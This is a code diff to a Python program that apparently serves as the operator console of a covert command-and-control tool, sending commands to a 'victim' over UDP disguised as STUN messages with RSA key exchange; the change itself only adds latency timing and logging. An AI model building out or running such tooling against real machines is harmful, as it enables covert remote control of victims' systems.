@@ -53,6 +53,7 @@ def parse_public_key(text: str) -> rsa.PublicKey:
 
 # Handles the initial key exchange with the target
 def exchange_keys():
+    start_time = time.time()
     exchange_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while True:
         try:
@@ -67,11 +68,11 @@ def exchange_keys():
         log_info("<ansimagenta>Generating a new RSA keys, exchanging keys now.</ansimagenta>")
     exchange_sock.sendto(build_stun_message("gen_key"), (target_ip, target_port))
     exchange_sock.close()
-    get_response(listening_port)
+    get_response(listening_port, start_time)
     return
 
 # Listens for incoming UDP fragments and handles key exchange or message decryption
-def get_response(port):
+def get_response(port, start_time):
     global target_pub_key, buffer_size, chunk_size, total_data_size, max_data_allowed, target_ip, my_pub_key, my_priv_key
     ip = "0.0.0.0"
     received_chunks = {}
@@ -136,6 +137,10 @@ def get_response(port):
                 listen_socket.sendto(build_stun_message(f"PublicKey({my_pub_key.n}, {my_pub_key.e})".encode('utf8')), (target_ip, target_port))
                 log_success("<ansiblue>Successfully exchanged keys, you can now send commands securely.</ansiblue>")
                 listen_socket.close()
+                end_time = time.time()
+                latency = end_time - start_time
+                log_info(f"<ansiyellow>latency:</ansiyellow> <ansimagenta>{latency:.2f} seconds</ansimagenta>")
+                    
                 log_info(f"<ansicyan>stopped listening on</ansicyan> <ansigreen>{ip}</ansigreen><ansicyan>:</ansicyan><ansigreen>{port}</ansigreen><ansicyan>...</ansicyan>")
                 return
 
@@ -158,6 +163,9 @@ def get_response(port):
                     log_info(f"<ansicyan>received a response from</ansicyan> <ansigreen>{victim_ip}:{victim_port}</ansigreen><ansicyan> :</ansicyan>")
                     print_formatted_text(HTML(f"<ansigreen>{full_response}</ansigreen>"))
                     listen_socket.close()
+                    end_time = time.time()
+                    latency = end_time - start_time
+                    log_info(f"<ansiyellow>latency:</ansiyellow> <ansimagenta>{latency:.2f} seconds</ansimagenta>")
                     log_info(f"<ansicyan>stopped listening on</ansicyan> <ansigreen>{ip}</ansigreen><ansicyan>:</ansicyan><ansigreen>{port}</ansigreen><ansicyan>...</ansicyan>")
                     return
                 except:
@@ -266,8 +274,9 @@ def main():
 
                 # Use threads to send command and listen for response simultaneously
                 threads = []
+                start_time = time.time()
                 t1 = threading.Thread(target=send_command, args=(command, port))
-                t2 = threading.Thread(target=get_response, args=(port,))
+                t2 = threading.Thread(target=get_response, args=(port,start_time))
                 threads.append(t1)
                 threads.append(t2)
 
